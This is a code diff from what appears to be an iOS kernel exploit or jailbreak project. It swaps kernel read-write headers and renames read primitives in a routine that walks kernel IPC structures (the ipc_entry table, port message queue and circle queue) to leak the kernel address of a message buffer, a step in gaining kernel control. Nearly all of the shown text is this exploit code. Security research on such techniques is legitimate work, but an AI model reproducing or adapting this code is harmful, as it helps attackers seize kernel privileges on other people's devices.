@@ -8,9 +8,8 @@
 #import <Foundation/Foundation.h>
 #include <unistd.h>
 #include <mach/mach.h>
-#include "IOSurface_primitives.h"
 #include "boot_info.h"
-#include "pplrw.h"
+#include "fun/krw.h"
 int message_size_for_kalloc_size(int kalloc_size) {
 	return ((3*kalloc_size)/4) - 0x74;
 }
@@ -81,7 +80,7 @@ void *kalloc_msg(uint64_t size) {
 			NSLog(@"[-] invalid port name? 0x%x\n", port);
 			// sleep(2);
 		}
-	uint64_t is_table = kread64_smr_kfd(itk_space + 0x20);
+	uint64_t is_table = kread64_smr(itk_space + 0x20);
 	NSLog(@"is_table: %p",is_table);
 	// sleep(2);
 	uint64_t entry = is_table + port_index * 0x18/*SIZE(ipc_entry)*/;
@@ -93,16 +92,16 @@ void *kalloc_msg(uint64_t size) {
 	NSLog(@"object: %p",object);
 	// sleep(2);
 		// find the message buffer:
-		UInt64 mqueue = kread_ptr(port_kaddr + 0x20); // ipc_port.ip_messages
+		UInt64 mqueue = kread64_ptr(port_kaddr + 0x20); // ipc_port.ip_messages
 		NSLog(@"mqueue: %p",mqueue);
 	// sleep(2);
-		UInt64 circlequeue = kread_ptr(mqueue + 0x0); // ipc_mqueue.imq_messages
+		UInt64 circlequeue = kread64_ptr(mqueue + 0x0); // ipc_mqueue.imq_messages
 	NSLog(@"circlequeue: %p",circlequeue);
 	// sleep(2);
-		UInt64 head = kread_ptr(circlequeue + 0x0); // circle_queue_head.head
+		UInt64 head = kread64_ptr(circlequeue + 0x0); // circle_queue_head.head
 	NSLog(@"head: %p",head);
 	// sleep(2);
-		uint64_t message_buffer = kread_ptr(head - 0x0); // first element of the circle queue __container_of which would be a pointer to an ipc_kmsg (hopefully) aka our kernel message buffer
+		uint64_t message_buffer = kread64_ptr(head - 0x0); // first element of the circle queue __container_of which would be a pointer to an ipc_kmsg (hopefully) aka our kernel message buffer
 		NSLog(@"message buffer: %llx\n", message_buffer);
 	// sleep(2);
 		// leak the message buffer:
